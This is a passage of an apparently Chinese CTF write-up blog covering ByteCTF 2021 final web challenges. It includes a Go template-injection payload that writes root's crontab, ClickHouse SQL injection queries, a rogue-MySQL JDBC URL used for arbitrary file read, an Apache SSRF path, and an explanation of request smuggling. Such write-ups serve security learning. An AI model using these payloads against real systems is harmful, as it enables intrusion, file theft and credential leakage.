+<p>至于这里重复五遍，是手试的时候发现服务有时候不会百分百崩溃，但总体效果是对的，重复几次以防万一</p>
+<p>以及rmb说他们的做法是pkill，通过进程名批量杀进程，感觉差不多，不过他说他们的做法打出来是502，就不需要我这一步try except</p>
+<h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><p>golang的SSTI，但是我完全不会go，所以还临时学习了个把小时的go基础语法</p>
+<h3 id="go基本语法"><a href="#go基本语法" class="headerlink" title="go基本语法"></a>go基本语法</h3><p>go最为反人类的一点就是他和其他编程语言相反，是变量名在前，变量类型在后的，比如声明一个字符串a，go里面就得写成<code>var a string</code>，虽说可以隐式的<code>var a = &quot;string&quot;</code>声明变量，或者高级语法糖<code>a := &quot;string&quot;</code>，但在函数声明之类的地方还是显得异常折磨。。。<br>比如这个</p>
+<pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>context<span class="token punctuation">)</span> <span class="token function">File</span><span class="token punctuation">(</span>file <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>err <span class="token builtin">error</span><span class="token punctuation">)</span>
+</code></pre>
+<p>这个函数名为File，接收一个类型为string的参数file，返回值是名为err的error类型对象。那么，函数名前面的这个<code>(c *context)</code>又是个啥？<br>再学一下，golang没有类这个操作，都是由结构体进行数据类型的封装，那结构体不像类一样有函数啊，那咋搞呢，就用函数名前面这么个括号，来修饰这个函数的调用者是什么类型（好像官方说法叫接收者），在我看来就是把这个函数声明成对应结构体的成员函数了，因为只有这个结构体的对象才能调用这个方法嘛，也算是间接实现了类。。。<br>因此，<code>(c *context)</code>表示这个函数需要被一个context结构体对象调用，这里的c就相当于c++之类的语言里面的this，而星号可以理解为传引用，可以直接通过c修改调用者的属性，没有星号就是传值，函数内修改不影响调用者的值</p>
+<p>还有一点，go没有成员修饰符，也就是说没有public，private之类的功能，但是和java一样有package，package内的函数，可以访问该package中的任意变量和方法，而若是引用另一个package中的内容，则只有开头是大写字母的方法和变量能够被获取到，简单的理解就是首字符是大写字母public，首字符非大写字母private</p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>目标站点就两个功能，登录注册和查看log，log有用户名ip，ua之类的数据，打这里的模板注入（不过要能试出来这里是个go。。。要是我的话肯定第一反应是nodejs或者python之类的，不过也据说给了dockerfile？反正我看不到）<br>go的模板库有text&#x2F;template和html&#x2F;template两个，既然这里是web相关的，先默认他是html的这个库，而go的模板渲染与python，nodejs的都不一样，他只允许传入一个对象，然后使用该对象下面的成员进行模板渲染，不能像node或者python传入多个变量一一渲染<br>也由于这个原因，go的ssti危害性应当小于python和node的，因为<strong>只允许访问传入对象下的属性和方法</strong>，如果单纯的只是模板可控，而传入的对象本身无危险方法的话，可能就只能打个xss玩了<br>那么这里传入的对象是，gin下的context对象，gin是go中最常用的web框架，就像nodejs中的express，koa一样，context是会话上下文，里面有完整的request和response对象，以及一堆方法。包括了处理文件上传的方法</p>
+<pre class=" language-golang"><code class="language-golang">FormFile(name string) (*multipart.FileHeader, error)
+MultipartForm() (*multipart.Form, error)
+SaveUploadedFile(file *multipart.FileHeader, dst string) error
+</code></pre>
+<p>当然，go是究极编译语言，并不吃什么文件上传rce，因此是通过文件上传写root的crontab实现rce（据说也是dockerfile里写的，root启动的go+能写root的crontab &#x3D;&#x3D;&#x3D; 随意搅屎）<br>抄一个样例payload</p>
+<pre><code>{{ $a := .FormFile "file" }} {{ .SaveUploadedFile $a "/var/spool/cron/crontabs/root" }}
+</code></pre>
+<p>访问触发点的同时上传恶意文件即可</p>
+<p>模板中函数调用也不需要加括号，参数就直接按顺序放在后面就行<br>点号直接就是访问传入对象的属性，或者说，可以理解为再点号前面自动补全了一个this<br>这里有一个点稍微需要注意一下，<strong>不能调用没有返回值的函数</strong>，并且调用了没有返回值的函数会导致从这里开始后续的模板全部不被处理（本地测试的结果）<br>看了上交一个师傅写的wp，他提到调用的函数只允许有一个返回值，或两个返回值且第二个返回值是error类型</p>
+<p>至于怎么测试出来给的是gin的Context呢，简单翻了下文档没看见什么好用的，直接百度Context对象里有啥，然后找到了<code>Request.URL.Query()</code>这个方法，获取到所有的get参数，直接<code>{{.Request.URL.Query}}</code>渲染，就可以在渲染界面看到自己提交的get参数，算是验证了对象是context（这里Request虽然大写但实际上是一个对象名。。。因为前面提到的大写的对象名才被认为是公有的），也可以直接<code>{{.}}</code>之类的，配合模板语法还能range之类的遍历一下<br><code>{{range .Keys}}{{printf "%#q" .}}{{end}}</code>说是这个可以导出一些小写开头的变量？</p>
+<h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://pkg.go.dev/html/template">pkg html&#x2F;template</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.onsecurity.io/blog/go-ssti-method-research/">go ssti method research</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.kancloud.cn/liuqing_will/the_source_code_analysis_of_gin/616921">Context结构体</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.imwxz.com/crack_ctf/223.html">ByteCTF 2021 babyweb摸鱼wp</a></p>
+<h2 id="bytehouse"><a href="#bytehouse" class="headerlink" title="bytehouse"></a>bytehouse</h2><p>SQL注入，但是是 clickhouse这个奇怪的数据库，好像以前再哪场比赛上遇到过，但实在是不熟（搜了一下发现是字节初赛。。。并且那个题有点脑溢血）。题目很贴心，随你输什么，不仅没有过滤，还把报错返回给你，随便按两下就能看到 clickhouse这个独具一格的报错，也就能推测出数据库的类型了</p>
+<p>并且乱按的话还会输出查询语句，是用jdbc连的远程数据库，应该是指连接的mysql-server1的bytectf库下的users表<br><code>SELECT name FROM jdbc(&#39;jdbc:mysql://mysql-server1?password=root&#39;, &#39;bytectf&#39;, &#39;users&#39;) WHERE id = a</code></p>
+<p>也没有引号包裹什么的，随便打，先来一波union注入。 clickhouse的union注入语法为<code>union all select</code>，不过 clickhouse的数据类型判断好像比较强，有点像那个postgresql？一般来说用报错外带的方式来注数据</p>
+<p>直接<code>union all select * from system.columns</code>就会报错列不匹配，顺便会把整个库的所有列个展示出来（好人啊）</p>
+<p>这个数据库，太奇怪了一点。。。字符串拼接什么的也很麻烦，并且这里还配置了奇怪的内存限制，我从网上找资料拼出来了一个查全部数据库的payload，然后报错说预计使用的内存超出了限制，不给查，然后就只能写脚本反复跑了，运气好总有一次低于内存限制</p>
+<h3 id="基础注入语句"><a href="#基础注入语句" class="headerlink" title="基础注入语句"></a>基础注入语句</h3><pre><code>0 union all select arrayStringConcat((select groupUniqArray(name) FROM system.databases),&#39;,&#39;)
+
+INFORMATION_SCHEMA,bytectf,system,information_schema,default
+</code></pre>
+<p>arrayStringConcat的功能类似于mysql的group_concat，把查询结果拼成字符串，还可以插入分隔符，但查询结果本身是多行的话并不能用，而groupUniqArray就是把不重复的结果拼成一个array，两个函数组合起来才可用把多行查询结果变成一个字符串返回</p>
+<p>查一下bytectf这个库有啥</p>
+<pre><code>0+union+all+select+arrayStringConcat((select+groupUniqArray(name)+FROM+system.tables+where+database=&#39;bytectf&#39;),&#39;,&#39;)
+
+user
+</code></pre>
+<p>就一个user表<br>同理查列，也没什么数据</p>
+<pre><code>0+union+all+select+arrayStringConcat((select+groupUniqArray(name)+FROM+system.columns+where+table=&#39;user&#39;),&#39;,&#39;)
+
+id,user
+</code></pre>
+<p>查数据</p>
+<pre><code>&quot;0 union all select arrayStringConcat((select groupUniqArray(name) FROM bytectf.user),&#39;,&#39;)
+
+user2,user1,user3
+</code></pre>
+<p>好像和直接输入id的话结果不一样，因为直接输id只有user1&#x2F;2，而这里多出来一个，感觉应该是这里的bytectf是本地的数据库，而之前的数据库是通过jdbc连接的远程数据库，远程数据库是bytectf.users，只有两个数据</p>
+<p>但这些数据都没什么用，尝试读文件，但超级报错</p>
+<pre><code>0 union all SELECT c FROM file(&#39;/proc/self/cmdline&#39;, &#39;CSV&#39;, &#39;c String&#39;)
+
+ File `/proc/self/cmdline` is not inside `/var/lib/clickhouse/user_files`
+</code></pre>
+<p>看来非常的安全，有文件读路径的限制，似乎另一个利用就是用url函数ssrf发请求了。但暂时没东西可以打</p>
+<h3 id="rouge-mysql-server"><a href="#rouge-mysql-server" class="headerlink" title="rouge mysql server"></a>rouge mysql server</h3><p>我又忘了这一点。。。虽然我们交互的数据库是 clickhouse，但是他可以用jdbc去连接mysql，发起任意可控的mysql连接约等于任意文件读。。。<br>用GitHub上的经典rouge mysql server，python2启动</p>
+<pre><code>0 union all SELECT a from jdbc(&#39;jdbc:mysql://www.z3ratu1.cn:10012&#39;,&#39;test&#39;,&#39;test&#39;)
+
+Server asked for stream in response to &quot;LOAD DATA LOCAL INFILE&quot; but functionality is not enabled at client by setting &quot;allowLoadLocalInfile=true&quot; or specifying a path with &#39;allowLoadLocalInfileInPath&#39;.
+</code></pre>
+<p>超级报错，我一开始还以为是客户端关了这个操作，一搜发现，居然可以直接在url里加这个参数来开启，这个报错的意思也是直接在url参数里加就可以启用。。。<br>之后还有一个<code>max_allowed_packet</code>的类似问题，都可以通过改参数的方式解决<br>如下payload实现任意文件读</p>
+<pre><code>0 union all SELECT a from jdbc(&#39;jdbc:mysql://www.z3ratu1.cn:10012?useSSL=false&amp;allowLoadLocalInfile=true&amp;maxAllowedPacket=10000000&#39;,&#39;test&#39;,&#39;test&#39;)
+</code></pre>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.freebuf.com/articles/web/251626.html">JDBC MySQL任意文件读取中的一些坑</a></p>
+<p>先读&#x2F;etc&#x2F;hosts看看有哪些机器，读到一个<code>172.18.0.5 jdbc-bridge</code>（怎么感觉就是自己）</p>
+<p>读&#x2F;proc&#x2F;self&#x2F;cmdline，读出来了一堆我看不懂的东西</p>
+<pre><code>java -XX:+UseContainerSupport -XX:+IdleTuningCompactOnIdle -XX:+IdleTuningGcOnIdle -Xdump:none -Xdump:tool:events=systhrow+throw,filter=*OutOfMemoryError,exec=kill -9 %pid -Dlog4j.configuration=file:////app/log4j.properties -Dnashorn.args=--language=es6 -jar clickhouse-jdbc-bridge-shaded.jar
+</code></pre>
+<p>加了一堆buff，最后是用的clickhouse-jdbc-bridge-shaded.jar</p>
+<p>看了看简介，好像就是一个clickhouse再集成一个jdbc，可以连各种其他的数据库，官方还有docker，可以搞一个docker运行一下（我没有下了。。）<br>理论上开了docker之后可以看到一个路径<code>/app/logs/console.log</code>，读日志（从wp中直接获取的思路）</p>
+<h3 id="rouge-mysql超级踩坑"><a href="#rouge-mysql超级踩坑" class="headerlink" title="rouge mysql超级踩坑"></a>rouge mysql超级踩坑</h3><p>我直接尝试下这个日志然后发现卡了半天没反应。。。感觉会不会是日志太大了下不下来了？以及他这个jdbc好像也是同步的？我把上一个下log的请求卡住之后，后续的所有请求都卡住了。。只有关掉rouge mysql server断开连接才恢复正常</p>
+<p>然后把网上常见的几个rouge mysql server都下下来试了一遍，一个能打的都没有，都不能下载大文件，最常用的那个会卡住。<br>然后fnmsd神仙的那个看起来比较完善，GitHub上介绍是说50M文件都随便下，但实际使用时会报一个<code>45 is not a valid CharacterSet</code>的问题（去issue里看了一眼说是因为java connect版本太高，已经修了，可能这次的版本更高了，又不能用了。。。），剩下的零零散散的实现也都不能用</p>
+<p>最后我直接下rmb神仙自己写的<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/rmb122/rogue_mysql_server">rmb122&#x2F;rogue_mysql_server</a><br>唯一缺点是用go写的，还没编译出来，完全不会用。。。windows上虽然有Goland，但是编译的时候报错config.yaml找不到，并且报错的路径还是在一个temp目录下，在完全没有理解golang编译过程的情况下，我直接转移平台到Linux上（虽说昨天已经基础入门了golang语法，但是这并不意味着我能编译出来一个go的二进制程序）</p>
+<h3 id="读log"><a href="#读log" class="headerlink" title="读log"></a>读log</h3><p>显然这里是出题人一开始就设置好了的，在环境启动时连接了mysql-server2并查询了一个不存在的数据库，导致报错，而这样子就在日志文件中保留下来了连接server2时的密码</p>
+<pre><code>java.lang.IllegalStateException: Failed to infer schema from [jdbc:mysql://mysql-server2?password=ae260407425a4b4d708c42e07c292ee7] due to: Failed to access [jdbc:mysql://mysql-server2?password=ae260407425a4b4d708c42e07c292ee7] due to: Unknown database &#39;not_found_db&#39;
+</code></pre>
+<p>连上的虽然是mysql的server，但是查询语句还是得按clickhouse的规则来。。。不过比较贴心的是会报错，这样子就能很快的看到有哪些列之类的（这里列名必须大写，怪）</p>
+<pre><code>0 union all select * from jdbc(&#39;jdbc:mysql://mysql-server2?password=ae260407425a4b4d708c42e07c292ee7&#39;, &#39;information_schema&#39;, &#39;schemata&#39;)
+
+code: 258, message: Different number of columns in UNION ALL elements:
+name
+and
+CATALOG_NAME, SCHEMA_NAME, DEFAULT_CHARACTER_SET_NAME, DEFAULT_COLLATION_NAME, SQL_PATH, DEFAULT_ENCRYPTION
+</code></pre>
+<p>可以limit x,x+1一个个查，或者套一层之前的这个查询方法</p>
+<pre><code>0 union all select arrayStringConcat((select groupArray(SCHEMA_NAME) from jdbc(&#39;jdbc:mysql://mysql-server2?password=ae260407425a4b4d708c42e07c292ee7&#39;, &#39;information_schema&#39;, &#39;schemata&#39;)),&#39;,&#39;)
+
+mysql,information_schema,performance_schema,sys,bytectf
+</code></pre>
+<pre><code>0 union all select arrayStringConcat((select groupArray(TABLE_NAME) from jdbc(&#39;jdbc:mysql://mysql-server2?password=ae260407425a4b4d708c42e07c292ee7&#39;, &#39;information_schema&#39;, &#39;tables&#39;) where TABLE_SCHEMA=&#39;bytectf&#39;),&#39;,&#39;)
+
+flag
+</code></pre>
+<p>列名也是flag，最后查flag值</p>
+<pre><code>0 union all select arrayStringConcat((select groupArray(flag) from jdbc(&#39;jdbc:mysql://mysql-server2?password=ae260407425a4b4d708c42e07c292ee7&#39;, &#39;bytectf&#39;, &#39;flag&#39;)),&#39;,&#39;)
+
+bytectf&#123;JD6C_inj3ct_i5_funny&#125;
+</code></pre>
+<h4 id="golang安装编译入门"><a href="#golang安装编译入门" class="headerlink" title="golang安装编译入门"></a>golang安装编译入门</h4><p>编译rmb写的工具时遇到的各种问题<br>碎碎念拉满</p>
+<p>首先明确一点，**go的版本要不小于1.13!!!**，版本到了解决99%问题（为什么Ubuntu自带的是1.6这种究极远古版本），网上有很多安装的方法，但大多是手动下载并解压，新时代人类无法接受这种原始的方法，于是我直接寻找apt安装方法</p>
+<pre class=" language-bash"><code class="language-bash">add-apt-repository ppa:longsleep/golang-backports
+<span class="token function">apt-get</span> update
+<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> golang-go
+</code></pre>
+<p>能装一个1.13，虽然不是最新，但也达到基本要求了</p>
+<p>至于为什么要装1.13，其中有很多缘由。首先是golang有一系列的环境变量，这里着重讨论GOPATH，GOPATH之下主要包含三个目录: bin、pkg、src。bin是编译出来的二进制文件，pkg放第三方库，而src放项目源代码<br>如果你有多个项目，那么你应该在<code>GOPATH/src/</code>下分别建立多个项目文件夹。虽然也许这符合一定的规范，但我觉得项目都得位于某个固定位置下的设计非常愚蠢</p>
+<p>如果你要在其他地方布置项目的话，恐怕需要修改GOPATH，而GOPATH是一个全局变量，换过来之后又要改回去，更加显得愚蠢。。。</p>
+<p>而go在1.11版本后支持了全新的操作，go mod（module），可以进行类似包管理器的操作了，允许你直接引用<code>GOPATH/pkt</code>下面的第三方库，创建一个go.mod文件来记录依赖内容，并用一个go.sum文件保存checksum。这样子就能把项目创建在任何地方，而GOPATH也就是一个简单的第三方库路径而已了，早就应该这样子啊，这样子不才是比较合理的做法吗？？？</p>
+<p>有的地方经常推荐把GOPATH&#x2F;bin加入到PATH中，我暂时不想这么做。。。加入PATH并不会对编译项目有所帮助，只是单纯的go版本更新也是把go下载到GOPATH下面，为什么会有人这么设计。。。以及可能还会有一些下下来就能用的二进制软件。<br>还有一件事，GOPATH默认为什么是在<code>$HOME/go</code>下？我并不是很喜欢把一堆东西放在家目录下，所以我还手动改了下go的家目录，丢到<code>/usr/local/lib</code>下面了，希望这个名字符合他的功能</p>
+<p>另一个需要1.13版本的原因在于golang的一些依赖包，比如golang.org被墙了（为什么要墙这个。。。）然后go在1.13版本下才推出了一个代理功能，GOPROXY，使用这个就可以透明的指定国内的代理，指定完了就不用再管了，比较方便，不然你直接用go mod download还是用go get也好，都下不下来依赖</p>
+<p>反正，只要你的go版本大于1.13,，先<code>go env -w GOPROXY=https://goproxy.cn,direct</code>指定用国内镜像，然后<code>go mod download</code>一把梭下下来全部依赖，<code>go build main.go</code>，直接编译成功并能运行，我哭了</p>
+<p>总而言之，现代版go还是比较好用的，能直接一键安装依赖，做到拆包即用，老版本golang可真是反人类啊，我一开始用这Ubuntu自带的1.6人都用麻了</p>
+<h3 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.deteact.com/yandex-clickhouse-injection/">Yandex.ClickHouse injection</a></p>
+<h2 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h2><p>这个题是否有些玄幻？</p>
+<p>对外暴露的80端口开了一个Apache的代理，只能代理到一个http服务，http服务里面锤子没有，就一个index.html<br>内网还有一个python服务，但是Apache并不不能代理这个地址，且其不能直接出网，接受一个post提交的url，通过访问Apache的8123端口提供的代理服务出网访问url，根据dockerfile显示，代理服务用的basic认证方式，认证密码即为flag</p>
+<p>用前段时间的那个Apache ssrf的洞，用<code>/?unix:A*4100|http://internal/fetch</code>去访问，POST提交数据就和正常报文一致</p>
+<p>在requirement.txt中特别指出了<code>requests==2.25.1</code>，查了一下，最新版本是2.26.0，就是该版本后的一个版本，但去GitHub简单对比了一下，好像没有看到什么和代理有关的安全问题更新，唯一一个和proxy有关的更新是在session下某些操作导致凭证不发送相关的问题。似乎没用</p>
+<p>搜索历史漏洞，在2.20之前存在一个访问https被重定向到http情况下，requests会将凭证携带上再次发送的问题，这个的漏洞点在于http明文传输，可能会被监听网卡之类的方法嗅探，也不是这里能用的</p>
+<p>题解也比较玄幻，我暂未理解原理。先让目标站点访问一个重定向网页，使其使用https访问我们可控的一个站点，那么这次重定向请求中就会携带上Proxy-Authorization头，因为authorization类型是basic，直接base64解码即可拿到内容（什么原理）</p>
+<p>当proxy遇到一个302的时候，应该不是proxy继续跟随重定向，而是把重定向结果返回给requests，然后requests再发送第二个请求出去。requests重新发送的https请求和直接访问https站点发送的请求又有什么不同呢？为什么一定得是https协议重定向才会生效呢？读python源码吗，读不动了。。。</p>
+<p><code>read_the_source_code_to:ByteCTF&#123;Explo1t_1dAy_4nD_haV3_FuN&#125;</code></p>
+<h2 id="Aginx2"><a href="#Aginx2" class="headerlink" title="Aginx2"></a>Aginx2</h2><p>初赛出过的题目的加强版<br>初赛那个题我就没看懂，不过我对它用的是http2存在一定的印象</p>
+<p>简单的说就是有这么一个场景，前端有一个负载均衡服务器，后端是实际服务器，而客户端和前端沟通使用的是http2，而前端和后端沟通的时候又换回了http1.1，就会出现各种各样的请求夹带</p>
+<p>按理说如果前端和后端对应每个来自客户的连接都维护一个单独的连接的话，即使发生请求夹带也不会对不同用户产生影响，但当并发量非常大时这并不现实。同时，系统的端口数量恐怕也不支持进行这样的操作，并且tcp连接的三次握手和四次挥手在高并发情况下反复建了拆拆了建会导致极大的资源消耗。因此，通常采用的是一种被称为连接池的技术</p>
+<p>连接池，简单的说，就是前段和后端服务器维护一个数量为n的tcp连接，这个连接是长连接，当前端收到客户端的请求时，就从连接池中拿一个空闲的连接和后端进行交互，交互完了又把这个连接塞回连接池中，这样子就去除了每个请求都要进行tcp建立的开销</p>
+<p>但这样子也就复用了tcp连接，也会导致请求夹带的威胁出现。假设用户A发送了一个请求，但这个请求里面夹带了两个请求，前端认为只发出了一个请求，而后端则认为收到了两个请求，这样子用户A就会拿到自己发出的第一个请求的应答。<br>而这时用户B也发起了一个请求，并且前后端沟通的连接就是之前A发出夹带请求的连接，用户A发出的夹带请求就拼在了用户B请求的前面，可以通过一定的构造，使得用户B的正常请求被吞掉部分，但不影响后端对用户的辨识（xff头之类的），使得用户B发出的请求实际上变成了A夹带的请求，并接收到恶意的结果</p>
+<p>如果使用每个用户维护一个单独连接应该就不会出现上述情况，因为一个连接上只存在一个用户，那么夹带的请求只是会另该用户的下一个请求拿到夹带请求的结果，而不会对其他用户造成威胁</p>
+<p>至于如何在http2降级到http1.1时进行请求夹带，可以看这个black hat的这个议题<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://i.blackhat.com/EU-21/Wednesday/EU-21-Kettle-HTTP-The-Sequel-Is-Always-Worse.pdf">HTTP2-The-Sequel-Is-Always-Worse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/SSTI/" rel="tag"># SSTI</a>
+              <a href="/tags/SQLI/" rel="tag"># SQLI</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%5BHITCON2021%5Dweb.html" rel="prev" title="[HITCON2021]web">
+      <i class="fa fa-chevron-left"></i> [HITCON2021]web
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/hxpctf2021%E5%A4%8D%E7%8E%B0.html" rel="next" title="hxpctf2021复现">
+      hxpctf2021复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#bytectf2021final%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">bytectf2021final复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#seo"><span class="nav-number">1.1.</span> <span class="nav-text">seo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#windows%E4%B8%8B%E7%9A%84UDF"><span class="nav-number">1.1.1.</span> <span class="nav-text">windows下的UDF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.1.2.</span> <span class="nav-text">参考链接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nothing"><span class="nav-number">1.2.</span> <span class="nav-text">nothing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyweb"><span class="nav-number">1.3.</span> <span class="nav-text">babyweb</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="nav-number">1.3.1.</span> <span class="nav-text">go基本语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.3.2.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-1"><span class="nav-number">1.3.3.</span> <span class="nav-text">参考链接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bytehouse"><span class="nav-number">1.4.</span> <span class="nav-text">bytehouse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.4.1.</span> <span class="nav-text">基础注入语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rouge-mysql-server"><span class="nav-number">1.4.2.</span> <span class="nav-text">rouge mysql server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rouge-mysql%E8%B6%85%E7%BA%A7%E8%B8%A9%E5%9D%91"><span class="nav-number">1.4.3.</span> <span class="nav-text">rouge mysql超级踩坑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BBlog"><span class="nav-number">1.4.4.</span> <span class="nav-text">读log</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#golang%E5%AE%89%E8%A3%85%E7%BC%96%E8%AF%91%E5%85%A5%E9%97%A8"><span class="nav-number">1.4.4.1.</span> <span class="nav-text">golang安装编译入门</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-2"><span class="nav-number">1.4.5.</span> <span class="nav-text">参考链接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#proxy"><span class="nav-number">1.5.</span> <span class="nav-text">proxy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Aginx2"><span class="nav-number">1.6.</span> <span class="nav-text">Aginx2</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
